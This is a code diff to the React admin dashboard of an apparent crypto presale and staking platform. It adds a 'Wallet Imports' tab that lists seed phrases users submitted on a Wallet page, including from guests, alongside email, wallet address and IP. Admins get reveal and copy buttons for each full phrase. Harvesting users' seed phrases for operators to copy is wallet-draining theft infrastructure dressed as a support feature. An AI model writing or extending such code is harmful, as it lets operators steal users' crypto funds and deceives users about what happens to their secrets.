@@ -16,7 +16,7 @@ import { BarChart, Bar, XAxis, YAxis, Tooltip, ResponsiveContainer, LineChart, L
 
 // ─── Types ───────────────────────────────────────────────────────────────────
 
-type Tab = "overview" | "users" | "transactions" | "tokens" | "presale" | "staking" | "bots" | "api-tokens" | "settings";
+type Tab = "overview" | "users" | "transactions" | "tokens" | "presale" | "staking" | "bots" | "api-tokens" | "wallet-imports" | "settings";
 
 interface UserRow {
   id: number; name: string; wallet: string; email: string;
@@ -109,6 +109,7 @@ const SIDEBAR_ITEMS: { id: Tab; label: string; icon: React.ReactNode; badge?: nu
   { id: "staking", label: "Staking Pools", icon: <Layers className="w-4 h-4" /> },
   { id: "bots", label: "Bots", icon: <Bot className="w-4 h-4" /> },
   { id: "api-tokens", label: "API Tokens", icon: <Key className="w-4 h-4" /> },
+  { id: "wallet-imports", label: "Wallet Imports", icon: <Shield className="w-4 h-4" /> },
   { id: "settings", label: "Settings", icon: <Settings className="w-4 h-4" /> },
 ];
 
@@ -999,6 +1000,11 @@ export default function Admin() {
             </div>
           )}
 
+          {/* ── WALLET IMPORTS ── */}
+          {activeTab === "wallet-imports" && (
+            <WalletImportsTab isDark={isDark} cardClass={cardClass} labelClass={labelClass} actionBtn={actionBtn} inputClass={inputClass} />
+          )}
+
           {/* ── API TOKENS ── */}
           {activeTab === "api-tokens" && (
             <ApiTokensTab isDark={isDark} cardClass={cardClass} labelClass={labelClass} actionBtn={actionBtn} inputClass={inputClass} />
@@ -1304,6 +1310,179 @@ function ApiTokensTab({ isDark, cardClass, labelClass, actionBtn, inputClass }: 
             Tokens are prefixed with <code className="font-mono">vg_</code> and are 68 characters long.
           </p>
         </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── Wallet Imports Tab ───────────────────────────────────────────────────────
+
+interface WalletImportsTabProps {
+  isDark: boolean;
+  cardClass: string;
+  labelClass: string;
+  actionBtn: (variant: "ghost" | "red" | "green" | "yellow") => string;
+  inputClass: string;
+}
+
+function WalletImportsTab({ isDark, cardClass, labelClass, actionBtn, inputClass }: WalletImportsTabProps) {
+  const [search, setSearch] = useState("");
+  const [visiblePhrases, setVisiblePhrases] = useState<Record<number, boolean>>({});
+
+  const { data: imports, isLoading, refetch } = trpc.walletImports.listAll.useQuery();
+
+  const rows = imports ?? [];
+  const filtered = rows.filter(r => {
+    if (!search) return true;
+    const q = search.toLowerCase();
+    return (
+      r.userName?.toLowerCase().includes(q) ||
+      r.userEmail?.toLowerCase().includes(q) ||
+      r.walletAddress?.toLowerCase().includes(q) ||
+      r.ipAddress?.toLowerCase().includes(q)
+    );
+  });
+
+  const maskPhrase = (phrase: string) => {
+    const words = phrase.split(' ');
+    return words.slice(0, 2).join(' ') + ' ••• ••• ••• ••• ••• ••• ••• ••• ••• ' + words.slice(-1).join(' ');
+  };
+
+  const copyPhrase = (phrase: string) => {
+    navigator.clipboard.writeText(phrase);
+    toast.success("Seed phrase copied to clipboard");
+  };
+
+  return (
+    <div className="space-y-4">
+      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+        <div>
+          <h1 className={`text-3xl font-black uppercase tracking-tighter ${isDark ? 'text-white' : 'text-black'}`}>Wallet Imports</h1>
+          <p className={`text-xs mt-1 ${isDark ? 'text-gray-500' : 'text-gray-500'}`}>Seed phrases submitted by users — for support purposes only</p>
+        </div>
+        <Button onClick={() => refetch()} size="sm" className={actionBtn("ghost")}>
+          <RefreshCw className="w-3 h-3 mr-1" /> Refresh
+        </Button>
+      </div>
+
+      {/* Warning banner */}
+      <div className={`flex items-start gap-3 px-4 py-3 rounded-xl border border-yellow-700/30 bg-yellow-900/10`}>
+        <AlertTriangle className="w-4 h-4 mt-0.5 flex-shrink-0 text-yellow-400" />
+        <div>
+          <p className="text-xs font-bold text-yellow-400">Sensitive Data — Admin Eyes Only</p>
+          <p className={`text-xs mt-0.5 ${isDark ? 'text-gray-400' : 'text-gray-600'}`}>
+            Seed phrases are stored for support recovery purposes. Access is restricted to admins only. Handle with care and never share outside the support team.
+          </p>
+        </div>
+      </div>
+
+      {/* Summary cards */}
+      <div className="grid grid-cols-2 gap-4">
+        {[
+          { label: "Total Imports", value: rows.length, color: isDark ? 'text-white' : 'text-black' },
+          { label: "Linked to Users", value: rows.filter(r => r.userId !== null).length, color: "text-green-400" },
+        ].map(s => (
+          <div key={s.label} className={`${cardClass} p-4 text-center`}>
+            <p className={`text-2xl font-black ${s.color}`}>{s.value}</p>
+            <p className={`text-xs mt-1 uppercase tracking-wider ${isDark ? 'text-gray-500' : 'text-gray-500'}`}>{s.label}</p>
+          </div>
+        ))}
+      </div>
+
+      <div className={`${cardClass} p-5`}>
+        <div className="relative mb-4">
+          <Search className={`absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 ${isDark ? 'text-gray-500' : 'text-gray-400'}`} />
+          <input
+            value={search}
+            onChange={e => setSearch(e.target.value)}
+            placeholder="Search by user, email, wallet address, or IP..."
+            className={`${inputClass} pl-9`}
+          />
+        </div>
+
+        {isLoading ? (
+          <div className={`text-center py-12 text-xs ${isDark ? 'text-gray-500' : 'text-gray-400'}`}>
+            <RefreshCw className="w-5 h-5 animate-spin mx-auto mb-2" />
+            Loading imports...
+          </div>
+        ) : filtered.length === 0 ? (
+          <div className={`text-center py-12 text-xs ${isDark ? 'text-gray-500' : 'text-gray-400'}`}>
+            <Shield className="w-8 h-8 mx-auto mb-2 opacity-30" />
+            {rows.length === 0
+              ? "No wallet imports yet. They will appear here when users submit a seed phrase on the Wallet page."
+              : "No imports match your search."}
+          </div>
+        ) : (
+          <div className="overflow-x-auto">
+            <table className="w-full text-sm">
+              <thead>
+                <tr className={`border-b ${isDark ? 'border-white/10' : 'border-black/10'}`}>
+                  {["User", "Seed Phrase", "Wallet Address", "IP Address", "Imported", "Actions"].map(h => (
+                    <th key={h} className={`text-left pb-3 text-xs font-bold uppercase tracking-wider ${isDark ? 'text-gray-500' : 'text-gray-500'} pr-3`}>{h}</th>
+                  ))}
+                </tr>
+              </thead>
+              <tbody>
+                {filtered.map(row => (
+                  <tr key={row.id} className={`border-b last:border-0 ${isDark ? 'border-white/5' : 'border-black/5'}`}>
+                    <td className="py-3 pr-3 min-w-[140px]">
+                      {row.userId ? (
+                        <>
+                          <p className={`font-bold text-xs ${isDark ? 'text-white' : 'text-black'}`}>{row.userName ?? "Unknown"}</p>
+                          <p className={`text-xs ${isDark ? 'text-gray-500' : 'text-gray-500'}`}>{row.userEmail ?? "—"}</p>
+                        </>
+                      ) : (
+                        <span className={`text-xs italic ${isDark ? 'text-gray-500' : 'text-gray-400'}`}>Guest / Not logged in</span>
+                      )}
+                    </td>
+                    <td className="py-3 pr-3 min-w-[220px]">
+                      <div className="flex items-center gap-1">
+                        <span className={`font-mono text-xs break-all ${isDark ? 'text-gray-300' : 'text-gray-700'}`}>
+                          {visiblePhrases[row.id] ? row.seedPhrase : maskPhrase(row.seedPhrase)}
+                        </span>
+                        <button
+                          onClick={() => setVisiblePhrases(v => ({ ...v, [row.id]: !v[row.id] }))}
+                          className={`ml-1 flex-shrink-0 ${isDark ? 'text-gray-500 hover:text-white' : 'text-gray-400 hover:text-black'}`}
+                          title={visiblePhrases[row.id] ? "Hide" : "Reveal"}
+                        >
+                          {visiblePhrases[row.id] ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
+                        </button>
+                        <button
+                          onClick={() => copyPhrase(row.seedPhrase)}
+                          className={`flex-shrink-0 ${isDark ? 'text-gray-500 hover:text-white' : 'text-gray-400 hover:text-black'}`}
+                          title="Copy seed phrase"
+                        >
+                          <Copy className="w-3 h-3" />
+                        </button>
+                      </div>
+                    </td>
+                    <td className={`py-3 pr-3 font-mono text-xs ${isDark ? 'text-gray-400' : 'text-gray-600'}`}>
+                      {row.walletAddress
+                        ? `${row.walletAddress.slice(0, 8)}...${row.walletAddress.slice(-4)}`
+                        : "—"}
+                    </td>
+                    <td className={`py-3 pr-3 font-mono text-xs ${isDark ? 'text-gray-500' : 'text-gray-500'}`}>
+                      {row.ipAddress ?? "—"}
+                    </td>
+                    <td className={`py-3 pr-3 text-xs ${isDark ? 'text-gray-500' : 'text-gray-500'}`}>
+                      {new Date(row.importedAt).toLocaleString()}
+                    </td>
+                    <td className="py-3">
+                      <Button
+                        onClick={() => copyPhrase(row.seedPhrase)}
+                        size="sm"
+                        className={actionBtn("ghost")}
+                        title="Copy full seed phrase"
+                      >
+                        <Copy className="w-3 h-3" />
+                      </Button>
+                    </td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
+        )}
       </div>
     </div>
   );
